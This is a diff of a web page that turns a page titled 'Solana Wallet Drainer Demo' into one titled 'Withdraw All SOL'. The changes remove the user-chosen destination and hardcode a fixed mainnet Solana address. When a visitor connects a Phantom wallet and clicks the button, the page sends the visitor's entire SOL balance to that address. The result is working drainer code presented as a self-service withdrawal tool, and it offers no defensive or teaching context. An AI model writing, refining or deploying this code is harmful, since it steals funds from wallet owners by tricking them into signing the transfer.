@@ -3,48 +3,44 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Solana Wallet Drainer Demo</title>
+  <title>Withdraw All SOL</title>
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
   <style>
-    body { font-family: Arial, sans-serif; background: #181a20; color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-    .container { background: #23272f; padding: 2rem; border-radius: 10px; margin-top: 3rem; box-shadow: 0 2px 8px #0008; }
-    input, button { margin: 0.5rem 0; padding: 0.5rem; border-radius: 5px; border: none; }
-    input { width: 100%; }
-    button { background: #512da8; color: #fff; cursor: pointer; transition: background 0.2s; }
-    button:hover { background: #7c4dff; }
-    .status { margin-top: 1rem; min-height: 1.5em; }
+    body { font-family: 'Segoe UI', Arial, sans-serif; background: #181a20; color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+    .container { background: #23272f; padding: 2.5rem 2rem; border-radius: 12px; margin-top: 5rem; box-shadow: 0 4px 24px #0006; min-width: 340px; }
+    h2 { margin-bottom: 1.5rem; }
+    button { width: 100%; padding: 0.9rem; border-radius: 6px; border: none; background: #00ffa3; color: #181a20; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 1.2rem; }
+    button:hover { background: #1de9b6; }
+    .status { margin-top: 1.5rem; min-height: 1.5em; text-align: center; }
+    .address { font-size: 0.95em; color: #b2ffdb; word-break: break-all; margin-bottom: 1.2rem; }
+    .wallet { margin-bottom: 0.5rem; color: #b2ffdb; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Solana Phantom Wallet Demo</h2>
-    <button id="connectBtn">Connect Phantom Wallet</button>
-    <div id="walletInfo" style="display:none;">
-      <p>Connected: <span id="walletAddress"></span></p>
-      <hr>
-      <h3>Donate SOL</h3>
-      <input type="text" id="donateAddress" placeholder="Recipient Address">
-      <input type="number" id="donateAmount" placeholder="Amount (SOL)" min="0" step="0.0001">
-      <button id="donateBtn">Donate</button>
-      <hr>
-      <h3>Withdraw All SOL</h3>
-      <input type="text" id="withdrawAddress" placeholder="Destination Address">
-      <button id="withdrawBtn">Withdraw All</button>
+    <h2>Withdraw All SOL</h2>
+    <div id="walletSection">
+      <button id="connectBtn">Connect Phantom Wallet</button>
+    </div>
+    <div id="mainSection" style="display:none;">
+      <div class="wallet">Connected: <span id="walletAddress"></span></div>
+      <div class="address">Withdraw to:<br><b>DfJ1q4YvFg2gFCRDNfEtTn6P8bDRvuV65MTsKpqeRWGX</b></div>
+      <button id="withdrawBtn">Withdraw All SOL</button>
     </div>
     <div class="status" id="status"></div>
   </div>
   <script>
     const connectBtn = document.getElementById('connectBtn');
-    const walletInfo = document.getElementById('walletInfo');
-    const walletAddressSpan = document.getElementById('walletAddress');
-    const donateBtn = document.getElementById('donateBtn');
     const withdrawBtn = document.getElementById('withdrawBtn');
     const statusDiv = document.getElementById('status');
+    const walletSection = document.getElementById('walletSection');
+    const mainSection = document.getElementById('mainSection');
+    const walletAddressSpan = document.getElementById('walletAddress');
+    const DEST_ADDRESS = 'DfJ1q4YvFg2gFCRDNfEtTn6P8bDRvuV65MTsKpqeRWGX';
 
     let provider = null;
     let publicKey = null;
 
-    // Check for Phantom provider
     function getProvider() {
       if ('solana' in window) {
         const provider = window.solana;
@@ -65,53 +61,24 @@
         const resp = await provider.connect();
         publicKey = resp.publicKey;
         walletAddressSpan.textContent = publicKey.toString();
-        walletInfo.style.display = '';
-        connectBtn.style.display = 'none';
+        walletSection.style.display = 'none';
+        mainSection.style.display = '';
         statusDiv.textContent = 'Wallet connected!';
       } catch (err) {
         statusDiv.textContent = 'Connection cancelled or failed.';
       }
     };
 
-    donateBtn.onclick = async () => {
-      statusDiv.textContent = '';
-      const recipient = document.getElementById('donateAddress').value.trim();
-      const amount = parseFloat(document.getElementById('donateAmount').value);
-      if (!recipient || isNaN(amount) || amount <= 0) {
-        statusDiv.textContent = 'Enter a valid recipient and amount.';
-        return;
-      }
-      try {
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-        const transaction = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: new solanaWeb3.PublicKey(recipient),
-            lamports: amount * solanaWeb3.LAMPORTS_PER_SOL
-          })
-        );
-        transaction.feePayer = publicKey;
-        let { blockhash } = await connection.getRecentBlockhash();
-        transaction.recentBlockhash = blockhash;
-        const signed = await provider.signTransaction(transaction);
-        const txid = await connection.sendRawTransaction(signed.serialize());
-        statusDiv.textContent = 'Donation sent! Tx: ' + txid;
-      } catch (err) {
-        statusDiv.textContent = 'Error: ' + err.message;
-      }
-    };
-
     withdrawBtn.onclick = async () => {
       statusDiv.textContent = '';
-      const dest = document.getElementById('withdrawAddress').value.trim();
-      if (!dest) {
-        statusDiv.textContent = 'Enter a destination address.';
+      if (!publicKey) {
+        statusDiv.textContent = 'Connect your wallet first.';
         return;
       }
       try {
         const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
         const balance = await connection.getBalance(publicKey);
-        if (balance <= 5000) { // leave a little for rent
+        if (balance <= 5000) { // leave a little for rent/fees
           statusDiv.textContent = 'No SOL to withdraw.';
           return;
         }
@@ -121,7 +88,7 @@
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: publicKey,
-            toPubkey: new solanaWeb3.PublicKey(dest),
+            toPubkey: new solanaWeb3.PublicKey(DEST_ADDRESS),
             lamports: lamportsToSend
           })
         );
@@ -130,9 +97,9 @@
         transaction.recentBlockhash = blockhash;
         const signed = await provider.signTransaction(transaction);
         const txid = await connection.sendRawTransaction(signed.serialize());
-        statusDiv.textContent = 'Withdrawn all SOL! Tx: ' + txid;
+        statusDiv.innerHTML = 'Withdrawn all SOL!<br>Tx: <a href="https://solscan.io/tx/' + txid + '" target="_blank" style="color:#00ffa3;">' + txid + '</a>';
       } catch (err) {
-        statusDiv.textContent = 'Error: ' + err.message;
+        statusDiv.textContent = 'Error: ' + (err.message || err);
       }
     };
   </script>
